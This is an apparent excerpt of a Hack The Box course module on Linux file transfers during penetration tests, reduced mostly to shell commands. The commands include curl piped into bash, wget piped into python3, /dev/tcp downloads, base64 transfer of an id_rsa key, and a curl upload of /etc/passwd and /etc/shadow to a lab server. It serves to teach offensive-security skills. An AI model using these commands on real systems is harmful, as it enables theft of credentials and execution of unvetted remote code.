...
![Network diagram showing two Linux PCs, a Layer 2 switch, a firewall, and a cloud connection.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/LinuxDownloadUpload.drawio.png)
...
```shell-session
Hillside_1@htb[/htb]$ md5sum id_rsa
...
```shell-session
Hillside_1@htb[/htb]$ cat id_rsa |base64 -w 0;echo
...
```shell-session
Hillside_1@htb[/htb]$ echo -n '' | base64 -d > id_rsa
```
...
```shell-session
Hillside_1@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
...
```shell-session
Hillside_1@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
...
```shell-session
Hillside_1@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
...
```shell-session
Hillside_1@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
...
```shell-session
Hillside_1@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell-session
Hillside_1@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell-session
Hillside_1@htb[/htb]$ cat <&3
```
...
```shell-session
Hillside_1@htb[/htb]$ sudo systemctl enable ssh
...
```shell-session
Hillside_1@htb[/htb]$ sudo systemctl start ssh
```

#### Checking for SSH Listening Port

```shell-session
Hillside_1@htb[/htb]$ netstat -lnpt
...
```shell-session
Hillside_1@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```
...
```shell-session
Hillside_1@htb[/htb]$ sudo python3 -m pip install --user uploadserver
...
```shell-session
Hillside_1@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
...
```shell-session
Hillside_1@htb[/htb]$ mkdir https && cd https
```

```shell-session
Hillside_1@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
...
```shell-session
Hillside_1@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
...
```shell-session
Hillside_1@htb[/htb]$ python3 -m http.server
...
```shell-session
Hillside_1@htb[/htb]$ python2.7 -m SimpleHTTPServer
...
```shell-session
Hillside_1@htb[/htb]$ php -S 0.0.0.0:8000
...
```shell-session
Hillside_1@htb[/htb]$ ruby -run -ehttpd . -p8000
...
```shell-session
Hillside_1@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
...
```shell-session
Hillside_1@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
